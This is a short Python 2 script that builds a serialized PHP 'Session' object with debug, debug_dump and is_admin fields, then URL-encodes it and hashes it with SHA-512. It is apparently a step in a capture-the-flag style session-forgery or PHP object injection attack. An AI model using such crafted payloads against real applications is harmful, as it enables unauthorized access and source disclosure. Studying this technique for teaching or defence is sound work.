from urllib import quote
import hashlib

s = 'O:7:"Session":6:{s:14:"\x00Session\x00debug";b:0;s:19:"\x00Session\x00debug_dump";s:9:"index.php";s:13:"\x00Session\x00data";a:2:{s:8:"password";s:5:"guest";s:5:"admin";b:0;}s:4:"user";s:5:"guest";s:4:"pass";s:5:"guest";s:8:"is_admin";b:0;}'
print quote(s)
print hashlib.sha512(s).hexdigest()
